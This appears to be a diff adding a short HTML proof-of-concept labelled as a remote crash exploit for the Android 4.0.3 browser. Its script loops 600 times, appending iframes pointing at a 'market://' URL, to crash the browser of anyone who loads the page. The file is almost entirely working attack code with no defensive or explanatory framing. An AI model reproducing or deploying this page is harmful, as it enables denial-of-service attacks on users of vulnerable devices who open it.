@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<head></head>
+<title>Android 4.0.3 - Browser Remote Crash Exploit (HeapSpray)</title>
+
+<!-- 
+Android 4.0.3 - Browser Remote Crash Exploit
+Credit: Jean Pascal Pereira <pereira@secbiz.de>
+POC   : http://www.0xffe4.org 
+-->
+
+
+<html>
+<body>
+<script type="text/javascript">
+var m_frame = "";
+  for(var i = 0; i < 600; i++)
+  {
+    m_frame = document.createElement("iframe");
+    m_frame.setAttribute("src", "market://a");
+
+    document.body.appendChild(m_frame);
+}
+</script></body>
+</html>
